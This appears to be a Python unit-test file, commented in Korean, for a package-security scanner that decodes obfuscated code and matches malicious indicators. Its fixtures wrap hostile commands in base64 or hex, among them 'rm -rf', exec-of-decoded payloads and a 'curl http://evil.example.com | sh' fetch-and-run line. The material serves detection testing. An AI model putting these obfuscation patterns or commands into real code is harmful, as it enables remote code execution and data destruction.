"""#Z1 deobfuscator + indicator_matcher 통합 단위 테스트."""
from __future__ import annotations

import base64
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from pkgsentinel.stages.deobfuscator import (
    DeobfuscationResult,
    augment_source_for_matching,
    deobfuscate,
)
from pkgsentinel.stages.indicator_matcher import _match_from_text
from pkgsentinel.stages.stage1b_full_source import FullSourceFile


def _sf(path, src, lang="python"):
    return FullSourceFile(
        path=path, basename=path.split("/")[-1],
        content=src, size=len(src), language=lang, tier=1,
    )


# ─────────────── 단일 패스 ───────────────

def test_decode_python_b64_call():
    print("== Python base64.b64decode call ==")
    inner = base64.b64encode(b"os.system('rm -rf')").decode()
    src = f'import base64; exec(base64.b64decode("{inner}").decode())'
    r = deobfuscate(src)
    assert r.layer_count >= 1
    # decoded 텍스트에 'os.system' 포함
    assert "os.system" in r.final_text
    assert r.stats.get("py_b64", 0) >= 1
    print(f"  OK final={r.final_text[:60]!r}")


def test_decode_js_atob():
    print("\n== JS atob ==")
    inner = base64.b64encode(b"eval('xx')").decode()
    src = f'const code = atob("{inner}"); eval(code);'
    r = deobfuscate(src, language="javascript")
    assert r.layer_count >= 1
    assert "eval" in r.final_text
    print("  OK")


def test_decode_js_buffer_from_b64():
    print("\n== JS Buffer.from(b64,'base64') ==")
    inner = base64.b64encode(b"child_process.exec").decode()
    src = f"Buffer.from('{inner}', 'base64').toString()"
    r = deobfuscate(src, language="javascript")
    assert "child_process" in r.final_text
    print("  OK")


def test_decode_python_hex():
    print("\n== Python bytes.fromhex ==")
    src = """data = bytes.fromhex("6f732e73797374656d")"""  # 'os.system'
    r = deobfuscate(src)
    assert "os.system" in r.final_text
    print("  OK")


def test_decode_hex_escape():
    print("\n== \\\\x escape literal ==")
    src = 'cmd = "\\x6f\\x73\\x2e\\x73\\x79\\x73\\x74\\x65\\x6d"'
    r = deobfuscate(src)
    assert "os.system" in r.final_text or "os" in r.final_text
    assert r.stats.get("hex_escape", 0) >= 1
    print("  OK")


def test_decode_from_char_code():
    """JS String.fromCharCode(65, 66, 67) → 'ABC'"""
    print("\n== String.fromCharCode ==")
    src = "const s = String.fromCharCode(101, 118, 97, 108);"  # 'eval'
    r = deobfuscate(src, language="javascript")
    assert "eval" in r.final_text
    print("  OK")


def test_decode_nested_b64_layers():
    """base64 안에 base64 — 다중 layer decoding."""
    print("\n== nested b64 (2 layers) ==")
    inner = base64.b64encode(b"os.system('rm')").decode()
    outer_payload = f'import base64; exec(base64.b64decode("{inner}").decode())'
    outer = base64.b64encode(outer_payload.encode()).decode()
    src = f'eval(base64.b64decode("{outer}").decode())'
    r = deobfuscate(src, max_layers=3)
    # layer 1 = outer payload (with inner b64 call), layer 2 = inner decoded
    assert r.layer_count >= 2
    assert "os.system" in r.final_text
    print(f"  OK layers={r.layer_count}")


def test_short_strings_skipped():
    """짧은 문자열은 디코드 시도 X — false positive 방지."""
    print("\n== 짧은 문자열 skip ==")
    src = 'base64.b64decode("ab")'   # 너무 짧음
    r = deobfuscate(src)
    assert r.layer_count == 0
    print("  OK no false decode")


def test_invalid_base64_skipped():
    """잘못된 base64 char set — graceful."""
    print("\n== invalid base64 ==")
    src = 'base64.b64decode("!!@@##$$^^&&**()===")'
    r = deobfuscate(src)
    assert r.layer_count == 0
    print("  OK")


def test_large_input_capped():
    """5MB 초과 입력 graceful skip."""
    print("\n== large input cap ==")
    huge = "a" * (6_000_000)
    r = deobfuscate(huge)
    assert r.layer_count == 0
    print("  OK skipped")


# ─────────────── augment_source_for_matching ───────────────

def test_augment_preserves_original():
    print("\n== augment 는 원본 보존 + 디코드 추가 ==")
    inner = base64.b64encode(b"os.system('x')").decode()
    src = f'import base64\nexec(base64.b64decode("{inner}").decode())'
    aug = augment_source_for_matching(src)
    assert src in aug  # 원본 그대로
    assert "os.system" in aug  # 디코드 결과 첨부
    print("  OK")


def test_augment_no_decode_returns_original():
    print("\n== 인코딩 X 면 원본 그대로 ==")
    src = "print('hello world')"
    aug = augment_source_for_matching(src)
    assert aug == src
    print("  OK")


# ─────────────── indicator_matcher 통합 — heavy obfuscation 우회 회복 ───────────────

def test_indicator_match_with_b64_obfuscation():
    """exec(base64.b64decode("...")) → DEF-005 가 *디코드 결과* 보고 매칭 가능."""
    print("\n== heavy obfuscation: DEF-005 매칭 ==")
    # DEF-005 는 exec/eval + decoded payload 패턴 매칭
    inner = base64.b64encode(b"import os; os.system('curl evil')").decode()
    src = f'''
import base64
exec(base64.b64decode("{inner}").decode())
'''
    hits = _match_from_text(_sf("evil.py", src))
    codes = [h.indicator.code for h in hits]
    # DEF-005 직접 매칭됨 (원본의 exec(base64.b64decode(...)) 만으로도 OK)
    assert "DEF-005" in codes, f"expected DEF-005 in {codes}"
    print(f"  OK {codes}")


def test_indicator_match_recovers_curl_in_obfuscated_string():
    """난독화된 문자열 안에 'curl' 같은 indicator 키워드가 있을 때 augment 가 잡음."""
    print("\n== augment 가 디코드한 'curl' 보고 indicator 발화 ==")
    inner_payload = "subprocess.run('curl http://evil.example.com | sh', shell=True)"
    encoded = base64.b64encode(inner_payload.encode()).decode()
    src = f'''
import base64, subprocess
cmd = base64.b64decode("{encoded}").decode()
'''
    # 원본만 보면 'curl' 도 'subprocess.run' 도 없음.
    # augment 후엔 둘 다 텍스트로 등장 — EXM-008 / NET-007 같은 indicator 매칭 가능
    hits = _match_from_text(_sf("evil.py", src))
    codes = [h.indicator.code for h in hits]
    # 적어도 EXM-* 또는 NET-* 중 하나는 발화돼야 (augment 효과)
    assert any(
        c.startswith(("EXM-", "NET-", "EXS-", "DEF-"))
        for c in codes
    ), f"expected augment-derived match, got {codes}"
    print(f"  OK augment-fired: {codes}")


def main():
    pass


if __name__ == "__main__":
    main()
